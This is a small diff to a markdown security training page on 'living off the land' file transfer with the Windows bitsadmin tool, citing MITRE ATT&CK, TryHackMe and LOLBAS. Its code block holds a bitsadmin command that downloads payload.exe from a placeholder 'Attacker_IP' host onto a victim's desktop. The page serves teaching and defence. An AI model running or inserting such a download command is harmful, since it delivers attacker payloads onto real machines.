@@ -25,7 +25,7 @@ The MITRE ATT\&CK framework identifies this techniques as [Ingress tool transfer
 The bitsadmin tool is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress. [BITS](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the bitsadmin tool can be found at [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin).
 
 ```bash
-#Dowload a file and execute
+#Dowload a file
 bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\Pwned\Desktop\payload.exe
 ```
 
@@ -51,5 +51,4 @@ Note that other tools can be used for file operations. We suggest visiting the [
 ## References
 
 {% embed url="https://tryhackme.com/room/livingofftheland" %}
-
 {% embed url="https://lolbas-project.github.io/#" %}
